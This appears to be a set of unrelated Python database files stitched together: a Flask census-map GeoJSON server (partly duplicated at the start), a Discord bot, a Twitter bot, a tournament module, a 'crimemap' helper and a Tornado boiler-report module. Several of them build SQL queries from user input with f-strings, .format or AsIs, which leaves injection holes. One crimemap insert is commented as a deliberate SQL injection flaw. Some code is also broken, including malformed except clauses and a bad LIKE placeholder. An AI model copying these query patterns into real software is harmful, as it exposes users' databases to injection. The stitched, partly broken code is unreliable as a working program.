        except psycopg2.Error:
            return "I can't SELECT : " + sql

        # print("Ran query in {0}".format(datetime.now() - start_time))
        # start_time = datetime.now()

        # Retrieve the results of the query
        rows = pg_cur.fetchall()
        # row_count = pg_cur.rowcount

        # Get the column names returned
        col_names = [desc[0] for desc in pg_cur.description]

    print("Got records from Postgres in {0}".format(datetime.now() - start_time))
    start_time = datetime.now()

    # # Find the index of the column that holds the geometry
    # geom_index = col_names.index("geometry")

    # output is the main content, row_output is the content from each record returned
    output_dict = dict()                    
    output_dict["type"] = "FeatureCollection"

    i = 0                    
    feature_array = list()                    

    # For each row returned...
    for row in rows:                    
        feature_dict = dict()
        feature_dict["type"] = "Feature"

        properties_dict = dict()

        # For each field returned, assemble the feature and properties dictionaries
        for col in col_names:
            if col == 'geometry':
                feature_dict["geometry"] = ast.literal_eval(str(row[col]))
            elif col == 'id':
                feature_dict["id"] = row[col]
            else:
                properties_dict[col] = row[col]

        feature_dict["properties"] = properties_dict

        feature_array.append(feature_dict)                    

        # start over
        i += 1                    

    # Assemble the GeoJSON
    output_dict["features"] = feature_array

    print("Parsed records into JSON in {1}".format(i, datetime.now() - start_time))
    print("Returned {0} records  {1}".format(i, datetime.now() - full_start_time))

    return Response(json.dumps(output_dict), mimetype='application/json')


if __name__ == '__main__':
    # import threading, webbrowser
    # # url = "http://127.0.0.1:8081?stats=B2712,B2772,B2775,B2778,B2781,B2793"
    # url = "http://127.0.0.1:8081/?stats=B2793&z=12"
    # threading.Timer(5, lambda: webbrowser.open(url)).start()

    app.run(host='0.0.0.0', port=8081, debug=True)



import ast
import json
# import math
# import os
import psycopg2

# import sys
import utils

from datetime import datetime

from contextlib import contextmanager

from flask import Flask
from flask import render_template
from flask import request
from flask import Response
from flask_compress import Compress

from psycopg2 import extras
from psycopg2.extensions import AsIs
from psycopg2.pool import ThreadedConnectionPool

app = Flask(__name__, static_url_path='')
Compress(app)

# set command line arguments
args = utils.set_arguments()

# get settings from arguments
settings = utils.get_settings(args)

# create database connection pool
pool = ThreadedConnectionPool(10, 30,
                              database=settings["pg_db"],
                              user=settings["pg_user"],
                              password=settings["pg_password"],
                              host=settings["pg_host"],
                              port=settings["pg_port"])


@contextmanager
def get_db_connection():
    """
    psycopg2 connection context manager.
    Fetch a connection from the connection pool and release it.
    """
    try:
        connection = pool.getconn()
        yield connection
    finally:
        pool.putconn(connection)


@contextmanager
def get_db_cursor(commit=False):
    """
    psycopg2 connection.cursor context manager.
    Creates a new cursor and closes it, committing changes if specified.
    """
    with get_db_connection() as connection:
        cursor = connection.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        try:
            yield cursor
            if commit:
                connection.commit()
        finally:
            cursor.close()


@app.route("/")
def homepage():
    return render_template('index.html')


@app.route("/get-bdy-names")
def get_boundary_name():
    # Get parameters from querystring
    min = int(request.args.get('min'))
    max = int(request.args.get('max'))

    boundary_zoom_dict = dict()

    for zoom_level in range(min, max + 1):
        boundary_zoom_dict["{0}".format(zoom_level)] = utils.get_boundary_name(zoom_level)

    return Response(json.dumps(boundary_zoom_dict), mimetype='application/json')


@app.route("/get-metadata")
def get_metadata():
    full_start_time = datetime.now()
    start_time = datetime.now()

    # Get parameters from querystring
    num_classes = int(request.args.get('n'))
    raw_stats = request.args.get('stats')

    # replace all maths operators to get list of all the stats we need
    search_stats = raw_stats.upper().replace(" ", "").replace("(", "").replace(")", "") \
        .replace("+", ",").replace("-", ",").replace("/", ",").replace("*", ",").split(",")

    # TODO: add support for numbers in equations - need to strip them from search_stats list

    # equation_stats = raw_stats.lower().split(",")

    # print(equation_stats)
    # print(search_stats)

    # get stats tuple for query input (convert to lower case)
    search_stats_tuple = tuple([stat.lower() for stat in search_stats])

    # get all boundary names in all zoom levels
    boundary_names = list()

    for zoom_level in range(0, 16):
        bdy_name = utils.get_boundary_name(zoom_level)

        if bdy_name not in boundary_names:
            boundary_names.append(bdy_name)

    # get stats metadata, including the all important table number and map type (raw values based or normalised by pop)
    sql = "SELECT lower(sequential_id) AS id, " \
          "lower(table_number) AS \"table\", " \
          "replace(long_id, '_', ' ') AS description, " \
          "column_heading_description AS type, " \
          "CASE WHEN lower(long_id) LIKE '%%median%%' OR lower(long_id) LIKE '%%average%%' THEN 'values' " \
          "ELSE 'normalised' END AS maptype " \                    
          "FROM {0}.metadata_stats " \
          "WHERE lower(sequential_id) IN %s " \
          "ORDER BY sequential_id".format(settings["data_schema"], )

    with get_db_cursor() as pg_cur:
        try:
            pg_cur.execute(sql, (search_stats_tuple,))
        except psycopg2.Error:
            return "I can't SELECT :\n\n" + sql                    

        # Retrieve the results of the query
        rows = pg_cur.fetchall()

    # output is the main content, row_output is the content from each record returned
    response_dict = dict()
    response_dict["type"] = "StatsCollection"
    response_dict["classes"] = num_classes

    # output_array = list()

    # # get metadata for all boundaries (done in one go for frontend performance)
    # for boundary_name in boundary_names:
    #     output_dict = dict()
    #     output_dict["boundary"] = boundary_name
    #
    #     boundary_table = "{0}.{1}".format(settings["web_schema"], boundary_name)

    feature_array = list()

    # For each row returned assemble a dictionary
    for row in rows:
        feature_dict = dict(row)
        feature_dict["id"] = feature_dict["id"].lower()
        feature_dict["table"] = feature_dict["table"].lower()

        for boundary_name in boundary_names:
            boundary_table = "{0}.{1}".format(settings["web_schema"], boundary_name)

            data_table = "{0}.{1}_{2}".format(settings["data_schema"], boundary_name, feature_dict["table"])

            # get the values for the map classes
            with get_db_cursor() as pg_cur:
                stat_field = "CASE WHEN bdy.population > 0 THEN tab.{0} / bdy.population * 100.0 ELSE 0 END" \
                    .format(feature_dict["id"], )
                feature_dict[boundary_name] = utils.get_equal_interval_bins(
                    data_table, boundary_table, stat_field, pg_cur, settings)

        # add dict to output array of metadata
        feature_array.append(feature_dict)

    response_dict["stats"] = feature_array
    # output_array.append(output_dict)

    # print("Got metadata for {0} in {1}".format(boundary_name, datetime.now() - start_time))

    # # Assemble the JSON
    # response_dict["boundaries"] = output_array

    print("Returned metadata in {0}".format(datetime.now() - full_start_time))

    return Response(json.dumps(response_dict), mimetype='application/json')


@app.route("/get-data")
def get_data():
    full_start_time = datetime.now()
    start_time = datetime.now()

    # Get parameters from querystring

    map_left = request.args.get('ml')
    map_bottom = request.args.get('mb')
    map_right = request.args.get('mr')
    map_top = request.args.get('mt')

    stat_id = request.args.get('s')
    table_id = request.args.get('t')
    boundary_name = request.args.get('b')
    zoom_level = int(request.args.get('z'))

    # # get the number of decimal places for the output GeoJSON to reduce response size & speed up rendering
    # decimal_places = utils.get_decimal_places(zoom_level)

    # TODO: add support for equations

    # get the boundary table name from zoom level
    if boundary_name is None:
        boundary_name = utils.get_boundary_name(zoom_level)

    display_zoom = str(zoom_level).zfill(2)

    # stat_table_name = boundary_name + "_" + table_id
    #
    # boundary_table_name = "{0}".format(boundary_name)

    with get_db_cursor() as pg_cur:
        print("Connected to database in {0}".format(datetime.now() - start_time))
        start_time = datetime.now()

        # envelope_sql = "ST_MakeEnvelope({0}, {1}, {2}, {3}, 4283)".format(map_left, map_bottom, map_right, map_top)
        # geom_sql = "geojson_{0}".format(display_zoom)

        # build SQL with SQL injection protection
        sql = "SELECT bdy.id, bdy.name, bdy.population, tab.%s / bdy.area AS density, " \
              "CASE WHEN bdy.population > 0 THEN tab.%s / bdy.population * 100.0 ELSE 0 END AS percent, " \
              "tab.%s, geojson_%s AS geometry " \
              "FROM {0}.%s AS bdy " \
              "INNER JOIN {1}.%s_%s AS tab ON bdy.id = tab.{2} " \
              "WHERE bdy.geom && ST_MakeEnvelope(%s, %s, %s, %s, 4283) LIMIT ALL" \                    
            .format(settings['web_schema'], settings['data_schema'], settings['region_id_field'])

        try:
            # print(pg_cur.mogrify(sql, (AsIs(stat_id), AsIs(stat_id), AsIs(stat_id), AsIs(display_zoom), AsIs(boundary_name), AsIs(boundary_name), AsIs(table_id), AsIs(map_left), AsIs(map_bottom), AsIs(map_right), AsIs(map_top))))

            # yes, this is ridiculous - if someone can find a shorthand way of doing this then great!
            pg_cur.execute(sql, (AsIs(stat_id), AsIs(stat_id), AsIs(stat_id), AsIs(display_zoom),
                                 AsIs(boundary_name), AsIs(boundary_name), AsIs(table_id), AsIs(map_left),
                                 AsIs(map_bottom), AsIs(map_right), AsIs(map_top)))
        except psycopg2.Error:
            return "I can't SELECT : " + sql                    

        # print("Ran query in {0}".format(datetime.now() - start_time))
        # start_time = datetime.now()

        # Retrieve the results of the query
        rows = pg_cur.fetchall()
        # row_count = pg_cur.rowcount

        # Get the column names returned
        col_names = [desc[0] for desc in pg_cur.description]

    print("Got records from Postgres in {0}".format(datetime.now() - start_time))
    start_time = datetime.now()

    # # Find the index of the column that holds the geometry
    # geom_index = col_names.index("geometry")

    # output is the main content, row_output is the content from each record returned
    output_dict = dict()
    output_dict["type"] = "FeatureCollection"

    i = 0
    feature_array = list()

    # For each row returned...
    for row in rows:
        feature_dict = dict()
        feature_dict["type"] = "Feature"

        properties_dict = dict()

        # For each field returned, assemble the feature and properties dictionaries
        for col in col_names:
            if col == 'geometry':
                feature_dict["geometry"] = ast.literal_eval(str(row[col]))
            elif col == 'id':
                feature_dict["id"] = row[col]
            else:
                properties_dict[col] = row[col]

        feature_dict["properties"] = properties_dict

        feature_array.append(feature_dict)

        # start over
        i += 1

    # Assemble the GeoJSON
    output_dict["features"] = feature_array

    print("Parsed records into JSON in {1}".format(i, datetime.now() - start_time))
    print("Returned {0} records  {1}".format(i, datetime.now() - full_start_time))

    return Response(json.dumps(output_dict), mimetype='application/json')


if __name__ == '__main__':
    # import threading, webbrowser
    # # url = "http://127.0.0.1:8081?stats=B2712,B2772,B2775,B2778,B2781,B2793"
    # url = "http://127.0.0.1:8081/?stats=B2793&z=12"
    # threading.Timer(5, lambda: webbrowser.open(url)).start()

    app.run(host='0.0.0.0', port=5000, debug=True)


#!/usr/bin/python3

''' Module that lists all objects with a given attribute in a given table,
using SQLAlchemy, this is linked to a MySQL table via SQLAlchemy '''

from sys import argv
from model_state import Base, State
from sqlalchemy import create_engine
from sqlalchemy import Column, Integer, String
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

if __name__ == '__main__':
    engine = create_engine('mysql+mysqldb://{}:{}@localhost/{}'
                           .format(argv[1], argv[2], argv[3]))
    Base.metadata.create_all(engine)

    Session = sessionmaker(bind=engine)
    session = Session()
    state_name = session.query(State).filter(State.name.contains(argv[4]))                    
    try:
        print("{}".format(state_name[0].id))
    except:
        print("Not found")
    session.close()

import asyncio
import sqlite3

import discord
from discord.ext import commands

import to_sqlalchemy

class EDDB:
    def __init__(self, bot):
        self.bot = bot
        self.updating = False

    @commands.group(aliases=['elite', 'ed'])
    async def eddb(self, ctx):
        """Commands for getting data from EDDB.io"""
        if ctx.invoked_subcommand is None:
            await ctx.send('Invalid command passed. '
                            f'Try "{self.bot.command_prefix[0]}help eddb"')
        
    @eddb.command(aliases=['sys'])
    async def system(self, ctx, *, inp):
        """Searches the database for a system."""

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, self.system_search, inp)

        await ctx.send(result)

    def system_search(self, search):
        search = search.lower()
        conn = sqlite3.connect('data/ed.db').cursor()
        table = conn.execute(f"select * from populated where lower(name) = '{search}'")                    
        results = table.fetchone()
        if not results:
            table = conn.execute(f"select * from systems where lower(name) = '{search}'")                    
            results = table.fetchone()
        if results:
            keys = tuple(i[0] for i in table.description) 
            return '\n'.join(f'{key.replace("_", " ").title()}: {field}'
                             for key, field in zip(keys[1:], results[1:]) if field)
        else:
            return 'No systems found.'

    @eddb.command(aliases=['sta'])
    async def station(self, ctx, *, inp):
        """Searches the database for a station.
            To specify the system, put a comma after the station name and put the system there."""

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, self.station_search, inp)

        await ctx.send(result)

    def station_search(self, search, target_system=None, ctx=None):
        search = search.lower()
        conn = sqlite3.connect('data/ed.db').cursor()
        if ',' in search:
            search, target_system = (i.strip() for i in search.split(','))

        query = f"select * from stations where lower(name) = '{search}'"                    

        if target_system is not None: 
            target_system = target_system.lower()
            table = conn.execute(f"select id from populated where lower(name)='{target_system}'")                    
            results = table.fetchone()
            if results:
                target_system = results[0]
                query += f" and system_id = {target_system}"                    
            else:
                return 'System not found.'

        result = conn.execute(query)                    
        results = result.fetchall()

        if len(results) == 1:
            keys = tuple(i[0] for i in result.description) 
            return '\n'.join(f'{key.replace("_", " ").title()}: {field}'
                             for key, field in zip(keys[2:], results[0][2:]) if field)
        elif not results:
            return 'Station not found.'
        else:
            return 'Multiple stations found, please specify system.'

    @eddb.command(aliases=['b', 'bod'])
    async def body(self, ctx, *, inp):
        """Searches the database for a stellar body."""
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, self.body_search, inp)

        await ctx.send(result)

    def body_search(self, search):
        search = search.lower()
        conn = sqlite3.connect('data/ed.db').cursor()
        result = conn.execute(f"select * from bodies where lower(name) = '{search}'")                    
        results = result.fetchone()
        if results:
            keys = tuple(i[0] for i in result.description) 
            return '\n'.join(f'{key.replace("_", " ").title()}: {field}'
                             for key, field in zip(keys[2:], results[2:]) if field)
        else:
            return 'No bodies found.'

    @eddb.command(aliases=['u', 'upd'])
    async def update(self, ctx):
        """Updates the database. Will take some time."""
        if not self.updating:
            self.updating = True
            await ctx.send('Database update in progress...')
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, to_sqlalchemy.remake)
            await ctx.send('Database update complete.')
            self.updating = False
        else:
            await ctx.send('Database update still in progress.')


    @update.error
    async def update_error(self, exception, ctx):
        await self.bot.handle_error(exception, ctx)

    @eddb.command(aliases=['c', 'com', 'comm'])
    async def commodity(self, ctx, *, inp):
        """Searches the database for information on a commodity. Specify the station to get listing data.

            Input in the format: commodity[, station[, system]]"""
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, self.commodity_search, inp)
        await ctx.send(result)


    def commodity_search(self, search):
        search = search.lower().split(', ')
        conn = sqlite3.connect('data/ed.db').cursor()

        if len(search) == 1:
            table = conn.execute(f"select * from commodities where lower(name)='{search[0]}'")                    
            result = table.fetchone()
            if result:
                keys = tuple(i[0] for i in table.description)
                return '\n'.join(f'{key.replace("_", " ").title()}: {field}'
                                 for key, field in zip(keys[1:], result[1:]))
        
        elif len(search) < 4:
            table = conn.execute(f"select id from commodities where lower(name)='{search[0]}'")                    
            result = table.fetchone()
            if not result:
                return 'Commodity not found.'
            commodity_id = result[0]

            query = f"select id from stations where lower(name)='{search[1]}'"                    
            
            if len(search) == 3:
                table = conn.execute(f"select id from systems where lower(name)='{search[2]}'")                    
                result = table.fetchone()
                if not result:
                    return 'System not found.'
                system_id = result[0]
                query += f" and system_id={system_id}"                    
            table = conn.execute(query)                    
            result = table.fetchall()
            if not result:
                return 'Station not found.'
            elif len(result) > 1:
                return 'Multiple stations found, please specify system.'
            station_id = result[0][0]

            table = conn.execute(f"select * from listings where station_id={station_id} "                    
                                 f"and commodity_id={commodity_id}")                    
            result = table.fetchone()
            if not result:
                return 'Commodity not available to be bought or sold at station.'

            keys = (i[0] for i in table.description)
            result = {k: v for k, v in zip(keys, result)}
            result.pop('station_id')
            result.pop('commodity_id')
            result.pop('id')
            ret = f'Commodity: {search[0].title()}\n'
            if len(search) > 1:
                ret += f'Station: {search[1].title()}\n'
            if len(search) > 2:
                ret += f'System: {search[2].title()}\n'
            return ret +('\n'.join(f'{key.replace("_", " ").title()}: {field}'
                             for key, field in result.items()))

        else:
            return 'Too many commas. What does that even mean.'
            

def setup(bot):
    from os import path
    if not path.exists('./data/ed.db'):
        from to_sqlalchemy import update
        update()
    bot.add_cog(EDDB(bot))

import psycopg2
import secretConstants

connectionString = (
    'dbname=' + secretConstants.DATABASE_NAME + 
    ' user=' + secretConstants.DATABASE_USER + 
    ' host=' + secretConstants.DATABASE_HOST + 
    ' password=' + secretConstants.DATABASE_PASSWORD +
    ' port=' + secretConstants.DATABASE_PORT
)
conn = None
result = None

def getAlcoholByName(name):
    name = fixTypingErrors(name)
    QUERY = (
        "SELECT barnivore_product_name, barnivore_status, barnivore_country " + 
        "FROM barnivore_product " +
        "WHERE lower(barnivore_product_name) like lower('% \%s %')"                    
    )
    
    try:
        conn = psycopg2.connect(connectionString)
        cur = conn.cursor()
        cur.execute(QUERY, (name))                    
        result = cur.fetchall()

    except(psycopg2.DatabaseError, e):                    
        print('Error %s' % e)    

    finally:
        if conn:
            conn.close()

    return result

def fixTypingErrors(name):
    name = name.lower() 
    if name == "guiness":
        name = "guinness"
    return name

#Uncomment for testing
#getAlcoholByName("guiness")



import psycopg2
import secretConstants

connectionString = (
    'dbname=' + secretConstants.DATABASE_NAME + 
    ' user=' + secretConstants.DATABASE_USER + 
    ' host=' + secretConstants.DATABASE_HOST + 
    ' password=' + secretConstants.DATABASE_PASSWORD +
    ' port=' + secretConstants.DATABASE_PORT
)
conn = None
result = None

def getLastReplied(messageType):
    QUERY = (
        "SELECT item_id from twitter_bot_vac_last_replied_id where name = '{0}'"
    ).format(messageType)
    
    try:
        conn = psycopg2.connect(connectionString)
        cur = conn.cursor()
        cur.execute(QUERY)
        result = cur.fetchone()

    except(psycopg2.DatabaseError, e):                    
        print('Error %s' % e)    

    finally:
        if conn:
            conn.close()

    return result[0]

#print(getLastReplied("DM"))
#print(getLastReplied("MENTION"))

def setLastReplied(messageType, itemId):
    QUERY = (
        "UPDATE twitter_bot_vac_last_replied_id SET item_id = '${0}' WHERE name = '${1}'"                    
    ).format(itemId, messageType)
    
    try:
        conn = psycopg2.connect(connectionString)
        cur = conn.cursor()
        cur.execute(QUERY)
        conn.commit()
        cur.close()

    except(psycopg2.DatabaseError, e):                    
        print('Error %s' % e)    

    finally:
        if conn:
            conn.close()


#setLastReplied("DM", "772180529001197572")

import tweepy
import secretConstants
import cgi
from getAlcohol import getAlcoholByName
from lastReplied import getLastReplied, setLastReplied

auth = tweepy.OAuthHandler(secretConstants.CONSUMER_KEY, secretConstants.CONSUMER_SECRET)
auth.set_access_token(secretConstants.ACCESS_TOKEN, secretConstants.ACCESS_TOKEN_SECRET)
api = tweepy.API(auth)

#alcoholName = "GUINESS"
#tweetAboutAlcohol(alcoholName)
#functions need to be declared above calling them it seems...

def formatReply(result):
    if result[2] == '':
        reply = result[0] + " is " + result[1] + "."
    elif result[0][2] != '' and result[2]:
        reply = result[0] + " brewed in " + result[2] + " is " + result[1] + "." 
    return reply

def getDMs():
    lastRepliedDmId = getLastReplied('DM')
    return api.direct_messages(full_text=True, since_id=lastRepliedDmId)

def replyToUnansweredDMs(dms):
    for dm in dms:
        results = getAlcoholByName(dm.text)
        if len(results) > 10:
            replyToDm = "Sorry but I know a lot of alcohol with that in the name, could you be more specific?"
            api.send_direct_message(screen_name=dm.sender_screen_name, text=replyToDm)
        elif results == []:
            replyToDm = "Unfortunately I cannot find the name of the alcohol you specified in my database, apologies."
            api.send_direct_message(screen_name=dm.sender_screen_name, text=replyToDm)
        else:
            for result in results:
                replyToDm = formatReply(result)
                api.send_direct_message(screen_name=dm.sender_screen_name, text=replyToDm)
        print(dm.sender_screen_name + " sent " + dm.text)                    
        setLastReplied('DM', dm.id_str)
    
def main():
    dms = getDMs()
    replyToUnansweredDMs(dms)


main()


def tweetAboutAlcohol(alcoholName):
    results = getAlcoholByName(alcoholName)

    tweetQueue = []
    for result in results: 
        status = formatReply(result)
        tweetQueue.append(status)

    for tweet in tweetQueue:
        api.update_status(status=tweet)
        print("tweeted: '" + tweet + "'")


#!/usr/bin/env python
# 
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2


def connect():
    """Connect to the PostgreSQL database.  Returns a database connection."""
    return psycopg2.connect("dbname=tournament")


def deleteMatches():
    """Remove all the match records from the database."""
    db = connect()
    c = db.cursor()
    c.execute('DELETE FROM matches')
    db.commit()
    db.close()


def deletePlayers():
    """Remove all the player records from the database."""
    db = connect()
    c = db.cursor()
    c.execute('DELETE FROM players')
    db.commit()
    db.close()


def countPlayers():
    """Returns the number of players currently registered."""
    db = connect()
    c = db.cursor()
    c.execute('SELECT count(player_id) from players')
    player_count = c.fetchone()[0]
    print player_count
    db.close()
    return player_count



def registerPlayer(name):
    """Adds a player to the tournament database.
  
    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)
  
    Args:
      name: the player's full name (need not be unique).
    """
    db = connect()
    c = db.cursor()
    c.execute('INSERT INTO players (player_name) VALUES (%s)', (name,))                    
    db.commit()
    db.close()


def playerStandings():
    """Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """
    db = connect()
    c = db.cursor()
    sql = ("SELECT player_id, player_name, COUNT(matches.winner) AS wins, "
             "(SELECT total_matches FROM total_view WHERE total_view.player_id = players.player_id) "
             "FROM players LEFT JOIN matches "
             "ON players.player_id = matches.winner "
             "GROUP BY players.player_id, players.player_name "
             "ORDER BY wins DESC")
    c.execute(sql)
    results = c.fetchall()
    db.close()
    return results


def reportMatch(winner, loser):
    """Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """
    db = connect()
    c = db.cursor()
    c.execute('INSERT INTO matches (winner, loser) '
              'VALUES (%s, %s)', (winner, loser,))
    db.commit()
    db.close()
 
 
def swissPairings():
    """Returns a list of pairs of players for the next round of a match.
  
    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.
  
    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """
    standings = playerStandings()
    length = len(standings)
    pairings = []

    x = 0
    while(x < length):
        id1 = standings[x][0]
        name1 = standings[x][1]
        id2 = standings[x + 1][0]
        name2 = standings[x + 1][1]
        pairings.append((id1, name1, id2, name2))
        x += 2
    return pairings




import pymysql
import dbconfig

class DBHelper:

    def connect(self, database="crimemap"):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # The following introduces a deliberate security flaw - SQL Injection
            query = "INSERT INTO crimes (description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import calendar
from datetime import date as libdate

import tornado
import tornado.gen

boiler_room_report_cols = [
	'T1', 'T2', 'gas_pressure',
	'boilers_all', 'boilers_in_use', 'torchs_in_use', 'boilers_reserve',
	'boilers_in_repair',
	'net_pumps_in_work', 'net_pumps_reserve', 'net_pumps_in_repair',
	'all_day_expected_temp1', 'all_day_expected_temp2',
	'all_day_real_temp1', 'all_day_real_temp2',
	'all_night_expected_temp1', 'all_night_expected_temp2',
	'all_night_real_temp1', 'all_night_real_temp2',
	'net_pressure1', 'net_pressure2',
	'net_water_consum_expected_ph', 'net_water_consum_real_ph',
	'make_up_water_consum_expected_ph', 'make_up_water_consum_real_ph',
	'make_up_water_consum_real_pd', 'make_up_water_consum_real_pm',
	'hardness', 'transparency'
]

##
# {
# 	boiler_id: {
# 		parameter: {
# 			day1: val1,
# 			day2: val2,
# 			...
# 		},
# 		...
# 	},
# 	...
# }
#
@tornado.gen.coroutine
def get_boilers_month_values(tx, year, month, columns):
	sql = 'SELECT boiler_room_id, DAY(date), {} FROM boiler_room_reports JOIN reports'\
	      ' ON(report_id = reports.id) WHERE '\
	      'YEAR(date) = %s AND MONTH(date) = %s'.format(",".join(columns))
	params = (year, month)
	cursor = yield tx.execute(query=sql, params=params)
	boilers = {}
	row = cursor.fetchone()
	while row:
		boiler_id = row[0]
		day = row[1]
		parameters = {}
		if boiler_id in boilers:
			parameters = boilers[boiler_id]
		else:
			boilers[boiler_id] = parameters
		for i in range(2, len(columns) + 2):
			val = row[i]
			col = columns[i - 2]
			values = {}
			if col in parameters:
				values = parameters[col]
			else:
				parameters[col] = values
			values[day] = val
		row = cursor.fetchone()
	return boilers

##
# Returns the array with values:
# { 'title': title_of_a_district, 'rooms':
#   [
#     {'id': boiler_id, 'name': boiler_name},
#     ...
#   ]
# }
#
@tornado.gen.coroutine
def get_districts_with_boilers(tx):
	sql = "SELECT districts.name, boiler_rooms.id, boiler_rooms.name FROM "\
	      "districts JOIN boiler_rooms "\
	      "ON (districts.id = boiler_rooms.district_id)"
	cursor = yield tx.execute(sql)
	row = cursor.fetchone()
	districts = {}
	while row:
		district = row[0]
		id = row[1]
		name = row[2]
		boilers = []
		if district in districts:
			boilers = districts[district]
		else:
			districts[district] = boilers
		boilers.append({ 'id': id, 'name': name })
		row = cursor.fetchone()
	result = []
	for district, boilers in sorted(districts.items(), key=lambda x: x[0]):
		result.append({ 'title': district, 'rooms': boilers })
	return result

##
# Get a report for the specified date.
# @param tx   Current transaction.
# @param date Date on which need to find a report.
# @param cols String with columns separated by commas: 'id, name, ...'.
#
# @retval Tuple with specified columns or the empty tuple.
#
@tornado.gen.coroutine
def get_report_by_date(tx, date, cols):
	sql = "SELECT {} FROM reports WHERE date = "\
	      "STR_TO_DATE(%s, %s)".format(cols)
	params = (date, '%d.%m.%Y')
	cursor = yield tx.execute(query=sql, params=params)
	return cursor.fetchone()

##
# Get report days and months by the given year.
# @param tx   Current transaction.
# @param year Year which need to find.
#
@tornado.gen.coroutine
def get_report_dates_by_year(tx, year):
	sql = "SELECT month(date) as month, day(date) as day "\
	      "FROM reports WHERE year(date) = %s"
	params = (year, )
	cursor = yield tx.execute(query=sql, params=params)
	return cursor.fetchall()

##
# Get identifiers and titles of all boiler rooms.
#
@tornado.gen.coroutine
def get_boiler_room_ids_and_titles(tx):
	sql = "SELECT boiler_rooms.id, boiler_rooms.name, districts.name "\
	      "from boiler_rooms JOIN districts ON(districts.id = district_id)";
	cursor = yield tx.execute(query=sql)
	tuples = cursor.fetchall()
	res = []
	for t in tuples:
		res.append({'id': t[0], 'title': "%s - %s" % (t[2], t[1])})
	return res

##
# Get parameters of the specified boiler room alog the year.
# @param tx      Current transaction.
# @param id      Identifier of the boiler room.
# @param year    Year along which need to gather parameters.
# @param columns List of the table columns needed to fetch.
#
# @retval Dictionary of the following format:
#         ...
#         day_number: {
#         	parameter1_of_this_day: [val1, val2, ..., val_days_count],
#         	....
#         	parameterN_of_this_day: [val1, val2, ..., val_days_count],
#         },
#         ...
#
@tornado.gen.coroutine
def get_boiler_year_report(tx, id, year, columns):
	sql = "SELECT date, {} FROM reports JOIN boiler_room_reports "\
	      "ON(reports.id = report_id) WHERE YEAR(date) = %s AND "\
	      "boiler_room_id = %s"\
	      .format(",".join(columns))
	params = (year, id)
	cursor = yield tx.execute(query=sql, params=params)
	data = cursor.fetchall()
	res = {}
	for row in data:
		params = {}
		date = row[0]
		day = date.timetuple().tm_yday
		i = 1
		for col in columns:
			params[col] = row[i]
			i += 1
		res[day] = params
	return res

##
# Get air temperature of all days in the specified year.
# @param year Year in which need to get air temperatures.
# @retval Dictionary with keys as day numbers and values as
#         temperatures.
#
@tornado.gen.coroutine
def get_year_temperature(tx, year):
	sql = "SELECT date, temp_average_air FROM reports WHERE YEAR(date) = %s"
	params = (year, )
	cursor = yield tx.execute(query=sql, params=params)
	data = cursor.fetchall()
	res = {}
	for row in data:
		day = row[0].timetuple().tm_yday
		res[day] = row[1]
	return res

##
# Delete report by the specified date.
#
@tornado.gen.coroutine
def delete_report_by_date(tx, date):
	sql = "DELETE FROM reports WHERE date = %s"
	params = (date, )
	cursor = yield tx.execute(query=sql, params=params)
	return cursor.fetchone()

##
# Get a district by the name.
# @param name District name.
# @param cols String with columns separated by commas: 'id, name', for example.
#
# @retval Tuple with found distict or the empty tuple.
#
@tornado.gen.coroutine
def get_district_by_name(tx, name, cols):
	sql = "SELECT {} FROM districts WHERE name = %s".format(cols)
	params = (name, )
	cursor = yield tx.execute(query=sql, params=params)
	return cursor.fetchone()

##
# Insert the new district to the districts table.
#
@tornado.gen.coroutine
def insert_district(tx, name):
	sql = "INSERT INTO districts(name) VALUES (%s)"
	params = (name, )
	yield tx.execute(query=sql, params=params)

##
# Get a boiler room by the specified district identifier and the boiler room
# name.
# @param tx      Current transaction.
# @param cols    String with columns separated by commas: 'id, name, ...'.
# @param dist_id Identifier of the district - 'id' from 'districts' table.
# @param name    Name of the boiler room.
#
# @retval Tuple with specified columns or the empty tuple.
#
@tornado.gen.coroutine
def get_boiler_room_by_dist_and_name(tx, cols, dist_id, name):
	sql = "SELECT {} FROM boiler_rooms WHERE district_id = %s AND "\
	      "name = %s".format(cols)
	params = (dist_id, name)
	cursor = yield tx.execute(query=sql, params=params)
	return cursor.fetchone()

##
# Insert the new boiler room to the boiler rooms table.
# @param tx      Current transaction.
# @param dist_id Identifier of the district - 'id' from 'districts' table.
# @param name    Name of the new boiler room.
#
@tornado.gen.coroutine
def insert_boiler_room(tx, dist_id, name):
	sql = "INSERT INTO boiler_rooms(district_id, name) "\
	      "VALUES (%s, %s)"
	params = (dist_id, name)
	yield tx.execute(query=sql, params=params)

##
# Get a value from iterable object by name, or None, if the object doesn't
# contain the name.
#
def get_safe_val(src, name):
